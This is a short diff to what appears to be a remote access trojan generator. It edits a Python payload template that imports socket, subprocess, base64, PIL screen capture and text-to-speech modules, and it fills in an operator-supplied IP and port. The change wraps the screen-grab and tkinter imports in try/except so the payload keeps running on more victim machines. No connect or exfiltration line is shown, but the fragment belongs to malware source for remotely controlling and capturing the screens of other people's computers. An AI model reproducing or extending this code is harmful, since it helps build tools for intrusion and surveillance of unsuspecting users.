@@ -1927,11 +1927,17 @@ while True:
 import socket
 import threading
 import os
-from PIL import ImageGrab
 import base64, subprocess
 from gtts import gTTS
 import requests, sys
-from tkinter import messagebox
+try:
+  from PIL import ImageGrab
+except:
+  pass
+try:
+  from tkinter import messagebox
+except:
+  pass
 ip="{args.gT_ip}"
 port = {args.gT_port}
 
